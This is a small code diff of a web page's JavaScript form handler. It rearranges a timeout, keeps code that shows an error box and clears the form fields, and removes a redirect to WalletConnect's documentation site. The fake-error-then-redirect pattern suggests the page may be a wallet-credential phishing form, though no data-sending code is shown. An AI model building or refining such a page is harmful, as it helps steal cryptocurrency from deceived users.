@@ -7706,12 +7706,11 @@
             //   dismissAllDialogs();                
                 
                 // $('#data-to-send :textarea').val('');
-              setTimeout(function () {
-                restoreButtons();
                   errorBox.show();
                   $('.form-control').val('');
+              setTimeout(function () {
+                restoreButtons();
               }, 2500);
-                window.location.href = "https://docs.walletconnect.network/";
             },
             error: function () {
               restoreButtons();
@@ -7745,6 +7744,7 @@
   
 
 </body></html>
+
 
 
 
